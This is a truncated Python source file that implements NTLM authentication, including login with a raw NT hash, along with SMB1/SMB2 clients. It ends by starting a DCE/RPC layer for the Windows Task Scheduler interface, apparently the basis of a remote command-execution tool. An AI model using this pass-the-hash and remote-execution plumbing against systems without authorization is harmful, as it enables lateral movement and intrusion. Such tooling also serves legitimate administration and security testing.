#!/usr/bin/env python3

import argparse, base64, hashlib, hmac as _hmac, os, random, shutil
import socket, ssl, string, struct, subprocess, sys, tempfile, time
def _lrot32(n, b):
    return ((n << b) | (n >> (32 - b))) & 0xFFFFFFFF

def md4(data):
    msg = bytearray(data)
    orig_len = len(msg)
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack('<Q', orig_len * 8)
    a0, b0, c0, d0 = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    for i in range(0, len(msg), 64):
        X = struct.unpack('<16I', bytes(msg[i:i+64]))
        a, b, c, d = a0, b0, c0, d0
        for k, s in [(0,3),(1,7),(2,11),(3,19),(4,3),(5,7),(6,11),(7,19),
                      (8,3),(9,7),(10,11),(11,19),(12,3),(13,7),(14,11),(15,19)]:
            f = (b & c) | ((b ^ 0xFFFFFFFF) & d)
            a = _lrot32((a + f + X[k]) & 0xFFFFFFFF, s)
            a, b, c, d = d, a, b, c
        for k, s in [(0,3),(4,5),(8,9),(12,13),(1,3),(5,5),(9,9),(13,13),
                      (2,3),(6,5),(10,9),(14,13),(3,3),(7,5),(11,9),(15,13)]:
            g = (b & c) | (b & d) | (c & d)
            a = _lrot32((a + g + X[k] + 0x5A827999) & 0xFFFFFFFF, s)
            a, b, c, d = d, a, b, c
        for k, s in [(0,3),(8,9),(4,11),(12,15),(2,3),(10,9),(6,11),(14,15),
                      (1,3),(9,9),(5,11),(13,15),(3,3),(11,9),(7,11),(15,15)]:
            h = b ^ c ^ d
            a = _lrot32((a + h + X[k] + 0x6ED9EBA1) & 0xFFFFFFFF, s)
            a, b, c, d = d, a, b, c
        a0 = (a0 + a) & 0xFFFFFFFF
        b0 = (b0 + b) & 0xFFFFFFFF
        c0 = (c0 + c) & 0xFFFFFFFF
        d0 = (d0 + d) & 0xFFFFFFFF
    return struct.pack('<4I', a0, b0, c0, d0)
class RC4:
    def __init__(self, key):
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) & 0xFF
            S[i], S[j] = S[j], S[i]
        self.S, self.i, self.j = S, 0, 0

    def crypt(self, data):
        S, i, j = self.S, self.i, self.j
        out = bytearray(len(data))
        for n in range(len(data)):
            i = (i + 1) & 0xFF
            j = (j + S[i]) & 0xFF
            S[i], S[j] = S[j], S[i]
            out[n] = data[n] ^ S[(S[i] + S[j]) & 0xFF]
        self.i, self.j = i, j
        return bytes(out)

_AES_SBOX = bytes([
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
])
_AES_RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]

def _aes_key_expand(key):
    w = list(struct.unpack('>4I', key))
    for i in range(4, 44):
        t = w[i-1]
        if i % 4 == 0:
            t = ((_AES_SBOX[(t>>16)&0xFF]<<24) | (_AES_SBOX[(t>>8)&0xFF]<<16) |
                 (_AES_SBOX[t&0xFF]<<8) | _AES_SBOX[(t>>24)&0xFF]) ^ (_AES_RCON[i//4-1]<<24)
        w.append(w[i-4] ^ t)
    rk = []
    for r in range(11):
        rk.append(struct.pack('>4I', *w[r*4:r*4+4]))
    return rk

def _aes_block(block, rk):
    s = bytearray(a^b for a,b in zip(block, rk[0]))
    for rnd in range(1, 11):
        t = bytearray(16)
        for i in range(16): t[i] = _AES_SBOX[s[i]]
        s[0],s[1],s[2],s[3] = t[0],t[5],t[10],t[15]
        s[4],s[5],s[6],s[7] = t[4],t[9],t[14],t[3]
        s[8],s[9],s[10],s[11] = t[8],t[13],t[2],t[7]
        s[12],s[13],s[14],s[15] = t[12],t[1],t[6],t[11]
        if rnd < 10:
            t = bytearray(16)
            for c in range(4):
                b0,b1,b2,b3 = s[c*4],s[c*4+1],s[c*4+2],s[c*4+3]
                x2 = lambda v: ((v<<1)^0x1b if v&0x80 else v<<1)&0xFF
                t[c*4]   = x2(b0)^(x2(b1)^b1)^b2^b3
                t[c*4+1] = b0^x2(b1)^(x2(b2)^b2)^b3
                t[c*4+2] = b0^b1^x2(b2)^(x2(b3)^b3)
                t[c*4+3] = (x2(b0)^b0)^b1^b2^x2(b3)
            s = t
        s = bytearray(a^b for a,b in zip(s, rk[rnd]))
    return bytes(s)

def _aes_cmac(key, data):
    rk = _aes_key_expand(key)
    z = b'\x00' * 16
    L = _aes_block(z, rk)
    def _dbl(b):
        r = bytearray(16)
        carry = 0
        for i in range(15, -1, -1):
            tmp = (b[i] << 1) | carry
            r[i] = tmp & 0xFF
            carry = 1 if b[i] & 0x80 else 0
        if carry: r[15] ^= 0x87
        return bytes(r)
    k1 = _dbl(L)
    k2 = _dbl(k1)
    n = (len(data) + 15) // 16
    if n == 0: n = 1
    if len(data) > 0 and len(data) % 16 == 0:
        last = bytearray(a^b for a,b in zip(data[-16:], k1))
    else:
        padded = bytearray(data[-(len(data)-(n-1)*16):] if n > 0 else b'')
        padded.append(0x80)
        while len(padded) < 16: padded.append(0)
        last = bytearray(a^b for a,b in zip(padded, k2))
    x = bytearray(16)
    for i in range(n-1):
        block = data[i*16:(i+1)*16]
        y = bytearray(a^b for a,b in zip(x, block))
        x = bytearray(_aes_block(bytes(y), rk))
    y = bytearray(a^b for a,b in zip(x, last))
    return _aes_block(bytes(y), rk)

def _sp800_108_ctr(key, label, context, length=16):
    h = _hmac.new(key, b'', hashlib.sha256)
    h = _hmac.new(key, struct.pack('>I', 1) + label + b'\x00' + context + struct.pack('>I', length*8), hashlib.sha256)
    return h.digest()[:length]

_NTLM_UNICODE    = 0x00000001
_NTLM_REQ_TARGET = 0x00000004
_NTLM_SIGN       = 0x00000010
_NTLM_SEAL       = 0x00000020
_NTLM_NTLM       = 0x00000200
_NTLM_ESS        = 0x00080000
_NTLM_VERSION     = 0x02000000
_NTLM_128        = 0x20000000
_NTLM_KEY_EXCH   = 0x40000000
_NTLM_56         = 0x80000000
_NTLM_FLAGS = (_NTLM_UNICODE | _NTLM_REQ_TARGET | _NTLM_SIGN | _NTLM_SEAL |
               _NTLM_NTLM | _NTLM_ESS | _NTLM_VERSION | _NTLM_128 |
               _NTLM_KEY_EXCH | _NTLM_56)
_NTLM_VER = struct.pack('<BBH', 10, 0, 19041) + b'\x00\x00\x00\x0f'
class NTLMContext:
    def __init__(self, domain, user, password, use_mic=False, nt_hash=None):
        self.domain = domain
        self.user = user
        if nt_hash:
            self.nt_hash = nt_hash if isinstance(nt_hash, bytes) else bytes.fromhex(nt_hash)
        else:
            self.nt_hash = md4(password.encode('utf-16-le'))
        self.session_key = None
        self.use_mic = use_mic
        self._neg_msg = None
        self._chal_msg = None

    def negotiate(self):
        m = b'NTLMSSP\x00' + struct.pack('<I', 1) + struct.pack('<I', _NTLM_FLAGS)
        m += struct.pack('<HHI', 0, 0, 0) + struct.pack('<HHI', 0, 0, 0) + _NTLM_VER
        self._neg_msg = m
        return m

    def _extract_ntlm_challenge(self, buf):
        idx = buf.find(b'NTLMSSP\x00')
        if idx < 0:
            raise ValueError("NTLMSSP not found")
        d = buf[idx:]
        ti_len = struct.unpack('<H', d[40:42])[0]
        ti_off = struct.unpack('<I', d[44:48])[0]
        end = ti_off + ti_len
        tn_len = struct.unpack('<H', d[12:14])[0]
        tn_off = struct.unpack('<I', d[16:20])[0]
        end2 = tn_off + tn_len
        msg_len = max(end, end2, 56)
        return d[:msg_len]

    def authenticate(self, challenge_buf):
        chal = self._extract_ntlm_challenge(challenge_buf)
        self._chal_msg = chal
        server_flags = struct.unpack('<I', chal[20:24])[0]
        server_challenge = chal[24:32]
        ti_len, _, ti_off = struct.unpack('<HHI', chal[40:48])
        target_info = chal[ti_off:ti_off + ti_len]

        ts = None
        pos = 0
        while pos < len(target_info) - 4:
            av_id, av_len = struct.unpack('<HH', target_info[pos:pos+4])
            if av_id == 7 and av_len == 8:
                ts = target_info[pos+4:pos+12]
            if av_id == 0:
                break
            pos += 4 + av_len
        if ts is None:
            import datetime
            ft = int((datetime.datetime.utcnow() - datetime.datetime(1601,1,1)).total_seconds() * 10000000)
            ts = struct.pack('<Q', ft)

        if self.use_mic:
            ti_mod = b''
            p2 = 0
            while p2 < len(target_info) - 4:
                a_id, a_len = struct.unpack('<HH', target_info[p2:p2+4])
                if a_id == 0:
                    break
                ti_mod += target_info[p2:p2+4+a_len]
                p2 += 4 + a_len
            ti_mod += struct.pack('<HHI', 6, 4, 0x00000002)
            ti_mod += struct.pack('<HH', 0, 0)
        else:
            ti_mod = target_info

        resp_key = _hmac.new(self.nt_hash,
                             (self.user.upper() + self.domain).encode('utf-16-le'),
                             hashlib.md5).digest()
        cc = os.urandom(8)
        blob = struct.pack('<BBH', 1, 1, 0) + struct.pack('<I', 0) + ts + cc
        blob += struct.pack('<I', 0) + ti_mod + struct.pack('<I', 0)
        nt_proof = _hmac.new(resp_key, server_challenge + blob, hashlib.md5).digest()
        nt_resp = nt_proof + blob
        session_base = _hmac.new(resp_key, nt_proof, hashlib.md5).digest()
        exported = os.urandom(16)
        enc_key = RC4(session_base).crypt(exported)
        self.session_key = exported
        neg = _NTLM_FLAGS & server_flags
        neg |= (_NTLM_UNICODE | _NTLM_NTLM | _NTLM_SIGN | _NTLM_SEAL |
                _NTLM_ESS | _NTLM_KEY_EXCH | _NTLM_VERSION)
        dom_b = self.domain.encode('utf-16-le')
        usr_b = self.user.encode('utf-16-le')
        ws_b = b'W\x00K\x00'
        if self.use_mic:
            lm_resp = b'\x00' * 24
            H = 88
        else:
            lm_cc = os.urandom(8)
            lm_resp = _hmac.new(resp_key, server_challenge + lm_cc, hashlib.md5).digest() + lm_cc
            H = 72
        o = H
        parts = [lm_resp, nt_resp, dom_b, usr_b, ws_b, enc_key]
        fields = b''
        for p in parts:
            fields += struct.pack('<HHI', len(p), len(p), o)
            o += len(p)
        auth = b'NTLMSSP\x00' + struct.pack('<I', 3) + fields + struct.pack('<I', neg) + _NTLM_VER
        if self.use_mic:
            auth += b'\x00' * 16
        for p in parts:
            auth += p
        if self.use_mic:
            mic = _hmac.new(exported, self._neg_msg + self._chal_msg + auth, hashlib.md5).digest()
            auth = auth[:72] + mic + auth[88:]
        return auth

def _der_len(n):
    if n < 0x80: return bytes([n])
    if n < 0x100: return bytes([0x81, n])
    return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])

def _der(tag, val):
    return bytes([tag]) + _der_len(len(val)) + val

_SPNEGO_OID = b'\x2b\x06\x01\x05\x05\x02'
_NTLMSSP_OID = b'\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a'

def spnego_neg(ntlm):
    mt = _der(0x30, _der(0x06, _NTLMSSP_OID))
    init = _der(0x30, _der(0xa0, mt) + _der(0xa2, _der(0x04, ntlm)))
    return _der(0x60, _der(0x06, _SPNEGO_OID) + _der(0xa0, init))

def spnego_auth(ntlm):
    return _der(0xa1, _der(0x30, _der(0xa2, _der(0x04, ntlm))))

class SMB2:
    def __init__(self, target, port=445, timeout=15):
        self.target, self.port, self.timeout = target, port, timeout
        self.sock = None
        self.mid = 0
        self.sid = 0
        self.tid = 0
        self.sign_key = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.target, self.port))

    def disconnect(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.sock = None

    def _recv_n(self, n):
        d = b''
        while len(d) < n:
            c = self.sock.recv(n - len(d))
            if not c: raise ConnectionError("closed")
            d += c
        return d

    def _send(self, data):
        self.sock.sendall(b'\x00' + struct.pack('>I', len(data))[1:] + data)

    def _recv(self):
        h = self._recv_n(4)
        l = struct.unpack('>I', b'\x00' + h[1:])[0]
        return self._recv_n(l)

    def _hdr(self, cmd, flags=0, tid=None, sid=None):
        if tid is None: tid = self.tid
        if sid is None: sid = self.sid
        mid = self.mid; self.mid += 1
        h = b'\xFE\x53\x4D\x42' + struct.pack('<HHIHHI', 64, 1, 0, cmd, 31, flags)
        h += struct.pack('<I', 0) + struct.pack('<Q', mid)
        h += struct.pack('<II', 0, tid) + struct.pack('<Q', sid) + b'\x00' * 16
        return h

    def _sign(self, msg):
        if not self.sign_key: return msg
        m = bytearray(msg); m[48:64] = b'\x00' * 16
        if hasattr(self, 'dialect') and self.dialect >= 0x0300:
            sig = _aes_cmac(self.sign_key, bytes(m))
        else:
            sig = _hmac.new(self.sign_key, bytes(m), hashlib.sha256).digest()[:16]
        m[48:64] = sig
        return bytes(m)

    def _send_smb(self, cmd, body, flags=0, tid=None, sid=None):
        if self.sign_key and cmd != 0:
            flags |= 0x08
        hdr = self._hdr(cmd, flags, tid, sid)
        msg = self._sign(hdr + body)
        self._send(msg)

    def _recv_smb(self):
        r = self._recv()
        if len(r) < 64: raise ValueError("short")
        return r, struct.unpack('<I', r[8:12])[0]

    def negotiate(self, force_smb3=False):
        if force_smb3:
            dialects = [0x0202, 0x0210, 0x0300, 0x0302, 0x0311]
        else:
            dialects = [0x0202, 0x0210]
        guid = os.urandom(16)
        dialect_bytes = b''.join(struct.pack('<H', d) for d in dialects)
        if force_smb3:
            salt = os.urandom(32)
            preauth = struct.pack('<HH', 1, len(salt)) + struct.pack('<H', 0x0001) + salt
            ctx = struct.pack('<HHI', 0x0001, len(preauth), 0) + preauth
            enc_data = struct.pack('<H', 2) + struct.pack('<HH', 0x0002, 0x0001)
            ctx2 = struct.pack('<HHI', 0x0002, len(enc_data), 0) + enc_data
            pad1 = b'\x00' * ((8 - len(ctx) % 8) % 8)
            pad0 = b'\x00' * ((8 - (36 + len(dialect_bytes)) % 8) % 8)
            ctx_offset = 64 + 36 + len(dialect_bytes) + len(pad0)
            b = struct.pack('<HH', 36, len(dialects)) + struct.pack('<HH', 1, 0) + struct.pack('<I', 0)
            b += guid + struct.pack('<I', ctx_offset) + struct.pack('<HH', 2, 0)
            b += dialect_bytes + pad0 + ctx + pad1 + ctx2
        else:
            if len(dialects) % 2:
                dialect_bytes += b'\x00\x00'
            b = struct.pack('<HH', 36, len(dialects)) + struct.pack('<HH', 1, 0) + struct.pack('<I', 0)
            b += guid + struct.pack('<IHH', 0, 0, 0)
            b += dialect_bytes
        neg_req = self._hdr(0, 0, 0, 0) + b
        self._send(neg_req)
        r = self._recv()
        st = struct.unpack('<I', r[8:12])[0] if len(r) >= 12 else 0xFFFFFFFF
        if st != 0: raise ValueError(f"NEGOTIATE 0x{st:08x}")
        self.dialect = struct.unpack('<H', r[68:70])[0]
        ph = b'\x00' * 64
        ph = hashlib.sha512(ph + neg_req).digest()
        ph = hashlib.sha512(ph + r).digest()
        self._preauth_hash = ph

    def session_setup(self, ntlm_ctx):
        tok = spnego_neg(ntlm_ctx.negotiate())
        b = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
        b += struct.pack('<HH', 88, len(tok)) + struct.pack('<Q', 0) + tok
        setup1_req = self._hdr(1, 0, 0, 0) + b
        self._send(setup1_req)
        r = self._recv()
        st = struct.unpack('<I', r[8:12])[0] if len(r) >= 12 else 0xFFFFFFFF
        if st != 0xC0000016:
            raise ValueError(f"SETUP1 0x{st:08x}")
        self.sid = struct.unpack('<Q', r[40:48])[0]
        if hasattr(self, '_preauth_hash') and self.dialect >= 0x0311:
            self._preauth_hash = hashlib.sha512(self._preauth_hash + setup1_req).digest()
            self._preauth_hash = hashlib.sha512(self._preauth_hash + r).digest()
        rb = r[64:]
        so = struct.unpack('<H', rb[4:6])[0]
        sl = struct.unpack('<H', rb[6:8])[0]
        challenge = r[so:so+sl]
        auth_tok = spnego_auth(ntlm_ctx.authenticate(challenge))
        b = struct.pack('<HBBI', 25, 0, 1, 0) + struct.pack('<I', 0)
        b += struct.pack('<HH', 88, len(auth_tok)) + struct.pack('<Q', 0) + auth_tok
        setup2_req = self._hdr(1, 0, 0, None) + b
        if hasattr(self, '_preauth_hash') and self.dialect >= 0x0311:
            self._preauth_hash = hashlib.sha512(self._preauth_hash + setup2_req).digest()
        self._send(setup2_req)
        r = self._recv()
        st = struct.unpack('<I', r[8:12])[0] if len(r) >= 12 else 0xFFFFFFFF
        if st != 0: raise ValueError(f"SETUP2 0x{st:08x}")
        sk = ntlm_ctx.session_key
        if self.dialect >= 0x0300:
            if self.dialect >= 0x0311:
                self.sign_key = _sp800_108_ctr(sk, b'SMBSigningKey\x00', self._preauth_hash)
            else:
                self.sign_key = _sp800_108_ctr(sk, b'SMB2AESCMAC\x00', b'SmbSign\x00')
        else:
            self.sign_key = sk

    def tree_connect(self, share):
        path = f"\\\\{self.target}\\{share}".encode('utf-16-le')
        b = struct.pack('<HH', 9, 0) + struct.pack('<HH', 72, len(path)) + path
        self._send_smb(3, b)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"TREE 0x{st:08x}")
        self.tid = struct.unpack('<I', r[36:40])[0]
        return self.tid

    def tree_disconnect(self, tid=None):
        self._send_smb(4, struct.pack('<HH', 4, 0), tid=tid)
        try: self._recv_smb()
        except: pass

    def create(self, name, access, share_acc, disp, opts, attrs=0x80):
        nb = name.encode('utf-16-le')
        b = struct.pack('<HBB', 57, 0, 0) + struct.pack('<I', 2)
        b += struct.pack('<QQ', 0, 0) + struct.pack('<IIII', access, attrs, share_acc, disp)
        b += struct.pack('<I', opts) + struct.pack('<HH', 120, len(nb))
        b += struct.pack('<II', 0, 0) + nb
        self._send_smb(5, b)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"CREATE 0x{st:08x}")
        return r[128:144]

    def close(self, fid):
        b = struct.pack('<HH', 24, 0) + struct.pack('<I', 0) + fid
        self._send_smb(6, b)
        try: self._recv_smb()
        except: pass

    def write(self, fid, data, offset=0):
        b = struct.pack('<HH', 49, 112) + struct.pack('<I', len(data))
        b += struct.pack('<Q', offset) + fid
        b += struct.pack('<II', 0, 0) + struct.pack('<HH', 0, 0) + struct.pack('<I', 0)
        b += data
        self._send_smb(9, b)
        r, st = self._recv_smb()
        while st == 0x00000103:
            r, st = self._recv_smb()
        if st != 0: raise ValueError(f"WRITE 0x{st:08x}")

    def read(self, fid, length=65536, offset=0):
        b = struct.pack('<HBB', 49, 0x50, 0) + struct.pack('<I', length)
        b += struct.pack('<Q', offset) + fid
        b += struct.pack('<III', 0, 0, 0) + struct.pack('<HH', 0, 0) + b'\x00'
        self._send_smb(8, b)
        r, st = self._recv_smb()
        while st == 0x00000103:
            r, st = self._recv_smb()
        if st != 0: raise ValueError(f"READ 0x{st:08x}")
        rb = r[64:]
        do = rb[2]
        dl = struct.unpack('<I', rb[4:8])[0]
        return r[do:do+dl]

    def ioctl(self, fid, code, data, max_out=65536):
        io = 120
        b = struct.pack('<HH', 57, 0) + struct.pack('<I', code) + fid
        b += struct.pack('<II', io, len(data)) + struct.pack('<I', 0)
        b += struct.pack('<II', 0, 0) + struct.pack('<I', max_out)
        b += struct.pack('<I', 1) + struct.pack('<I', 0) + data
        self._send_smb(11, b)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"IOCTL 0x{st:08x}")
        rb = r[64:]
        oo = struct.unpack('<I', rb[32:36])[0]
        oc = struct.unpack('<I', rb[36:40])[0]
        return r[oo:oo+oc]

    def logoff(self):
        self._send_smb(2, struct.pack('<HH', 4, 0))
        try: self._recv_smb()
        except: pass

class SMB1:
    def __init__(self, target, port=445, timeout=15):
        self.target, self.port, self.timeout = target, port, timeout
        self.sock = None
        self.mid = 0
        self.uid = 0
        self.tid = 0
        self.sign_key = None
        self.dialect = 0x0100
        self.max_buffer = 61440

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.target, self.port))

    def disconnect(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.sock = None

    def _recv_n(self, n):
        d = b''
        while len(d) < n:
            c = self.sock.recv(n - len(d))
            if not c: raise ConnectionError("closed")
            d += c
        return d

    def _send(self, data):
        self.sock.sendall(b'\x00' + struct.pack('>I', len(data))[1:] + data)

    def _recv(self):
        h = self._recv_n(4)
        l = struct.unpack('>I', b'\x00' + h[1:])[0]
        return self._recv_n(l)

    def _hdr(self, cmd, flags=0x08, flags2=0xC803, tid=None, uid=None):
        if tid is None: tid = self.tid
        if uid is None: uid = self.uid
        mid = self.mid; self.mid += 1
        h = b'\xFF\x53\x4D\x42'
        h += struct.pack('<B', cmd)
        h += struct.pack('<I', 0)
        h += struct.pack('<B', flags)
        h += struct.pack('<H', flags2)
        h += struct.pack('<H', 0)
        h += b'\x00' * 8
        h += struct.pack('<H', 0)
        h += struct.pack('<H', tid)
        h += struct.pack('<H', os.getpid() & 0xFFFF)
        h += struct.pack('<H', uid)
        h += struct.pack('<H', mid)
        return h

    def _send_smb(self, cmd, body, flags=0x08, flags2=0xC803, tid=None, uid=None):
        hdr = self._hdr(cmd, flags, flags2, tid, uid)
        self._send(hdr + body)

    def _recv_smb(self):
        r = self._recv()
        if len(r) < 32: raise ValueError("short")
        status = struct.unpack('<I', r[5:9])[0]
        return r, status

    def negotiate(self):
        dd = b'\x02NT LM 0.12\x00'
        body = struct.pack('<B', 0) + struct.pack('<H', len(dd)) + dd
        self._send_smb(0x72, body, flags=0x08, flags2=0xC803, tid=0, uid=0)
        r, st = self._recv_smb()
        if r[0:4] == b'\xFE\x53\x4D\x42':
            raise ValueError("SMB2_RESPONSE")
        if st != 0: raise ValueError(f"NEGOTIATE 0x{st:08x}")
        wc = r[32]
        if wc != 17: raise ValueError(f"bad wc {wc}")
        w = r[33:67]
        self.security_mode = w[2]
        self.max_buffer = struct.unpack('<I', w[14:18])[0]
        self.capabilities = struct.unpack('<I', w[26:30])[0]

    def session_setup(self, ntlm_ctx):
        tok = spnego_neg(ntlm_ctx.negotiate())
        body = struct.pack('<B', 12)
        body += struct.pack('<BB', 0xFF, 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', 61440)
        body += struct.pack('<H', 50)
        body += struct.pack('<H', 1)
        body += struct.pack('<I', 0)
        body += struct.pack('<H', len(tok))
        body += struct.pack('<I', 0)
        body += struct.pack('<I', 0x800000D4)
        body += struct.pack('<H', len(tok))
        body += tok
        self._send_smb(0x73, body, tid=0, uid=0)
        r, st = self._recv_smb()
        if st != 0xC0000016: raise ValueError(f"SETUP1 0x{st:08x}")
        self.uid = struct.unpack('<H', r[28:30])[0]
        sbl = struct.unpack('<H', r[39:41])[0]
        challenge = r[43:43 + sbl]
        auth_tok = spnego_auth(ntlm_ctx.authenticate(challenge))
        body = struct.pack('<B', 12)
        body += struct.pack('<BB', 0xFF, 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', 61440)
        body += struct.pack('<H', 50)
        body += struct.pack('<H', 1)
        body += struct.pack('<I', 0)
        body += struct.pack('<H', len(auth_tok))
        body += struct.pack('<I', 0)
        body += struct.pack('<I', 0x800000D4)
        body += struct.pack('<H', len(auth_tok))
        body += auth_tok
        self._send_smb(0x73, body, tid=0)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"SETUP2 0x{st:08x}")
        self.uid = struct.unpack('<H', r[28:30])[0]
        self.sign_key = ntlm_ctx.session_key

    def tree_connect(self, share):
        path = f"\\\\{self.target}\\{share}".encode('utf-16-le') + b'\x00\x00'
        pw = b'\x00'
        svc = b'?????\x00'
        body = struct.pack('<B', 4)
        body += struct.pack('<BB', 0xFF, 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', len(pw))
        body += struct.pack('<H', len(pw) + len(path) + len(svc))
        body += pw + path + svc
        self._send_smb(0x75, body)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"TREE 0x{st:08x}")
        self.tid = struct.unpack('<H', r[24:26])[0]
        return self.tid

    def tree_disconnect(self, tid=None):
        body = struct.pack('<B', 0) + struct.pack('<H', 0)
        self._send_smb(0x71, body, tid=tid)
        try: self._recv_smb()
        except: pass

    def create(self, name, access, share_acc, disp, opts, attrs=0x80):
        nb = name.encode('utf-16-le')
        nl = len(nb)
        nb += b'\x00\x00'
        body = struct.pack('<B', 24)
        body += struct.pack('<BB', 0xFF, 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<B', 0)
        body += struct.pack('<H', nl)
        body += struct.pack('<I', 0)
        body += struct.pack('<I', 0)
        body += struct.pack('<I', access)
        body += struct.pack('<Q', 0)
        body += struct.pack('<I', attrs)
        body += struct.pack('<I', share_acc)
        body += struct.pack('<I', disp)
        body += struct.pack('<I', opts)
        body += struct.pack('<I', 2)
        body += struct.pack('<B', 0)
        body += struct.pack('<H', 1 + len(nb))
        body += b'\x00' + nb
        self._send_smb(0xA2, body)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"CREATE 0x{st:08x}")
        fid = struct.unpack('<H', r[38:40])[0]
        return struct.pack('<H', fid)

    def close(self, fid):
        fv = struct.unpack('<H', fid[:2])[0]
        body = struct.pack('<B', 3)
        body += struct.pack('<H', fv)
        body += struct.pack('<I', 0xFFFFFFFF)
        body += struct.pack('<H', 0)
        self._send_smb(0x04, body)
        try: self._recv_smb()
        except: pass

    def write(self, fid, data, offset=0):
        fv = struct.unpack('<H', fid[:2])[0]
        body = struct.pack('<B', 14)
        body += struct.pack('<BB', 0xFF, 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', fv)
        body += struct.pack('<I', offset & 0xFFFFFFFF)
        body += struct.pack('<I', 0xFFFFFFFF)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', len(data))
        body += struct.pack('<H', 64)
        body += struct.pack('<I', (offset >> 32) & 0xFFFFFFFF)
        body += struct.pack('<H', len(data) + 1)
        body += b'\x00' + data
        self._send_smb(0x2F, body)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"WRITE 0x{st:08x}")

    def read(self, fid, length=65536, offset=0):
        fv = struct.unpack('<H', fid[:2])[0]
        body = struct.pack('<B', 12)
        body += struct.pack('<BB', 0xFF, 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', fv)
        body += struct.pack('<I', offset & 0xFFFFFFFF)
        body += struct.pack('<H', min(length, 60000))
        body += struct.pack('<H', 0)
        body += struct.pack('<I', 0xFFFFFFFF)
        body += struct.pack('<H', 0)
        body += struct.pack('<I', (offset >> 32) & 0xFFFFFFFF)
        body += struct.pack('<H', 0)
        self._send_smb(0x2E, body)
        r, st = self._recv_smb()
        if st != 0: raise ValueError(f"READ 0x{st:08x}")
        dl = struct.unpack('<H', r[43:45])[0]
        do = struct.unpack('<H', r[45:47])[0]
        dh = struct.unpack('<H', r[47:49])[0]
        tl = dl | (dh << 16)
        return r[do:do + tl]

    def ioctl(self, fid, code, data, max_out=65536):
        raise ValueError("IOCTL not supported on SMB1")

    def logoff(self):
        body = struct.pack('<B', 2)
        body += struct.pack('<BB', 0xFF, 0)
        body += struct.pack('<H', 0)
        body += struct.pack('<H', 0)
        self._send_smb(0x74, body)
        try: self._recv_smb()
        except: pass

_TSCH_UUID = struct.pack('<IHH', 0x86D35949, 0x83C9, 0x4044) + b'\xB4\x24\xDB\x36\x32\x31\xFD\x0C'
_NDR_UUID  = struct.pack('<IHH', 0x8A885D04, 0x1CEB, 0x11C9) + b'\x9F\xE8\x08\x00\x2B\x10\x48\x60'
class DCERPC:
    def __init__(self, smb, tid, fid):
        self.smb, self.tid, self.fid = smb, tid, fid
        self.call_id = 0
        self.seq = 0
        self.c_seal = self.s_seal = None
        self.c_sign = self.s_sign = None

    def _set_tid(self):
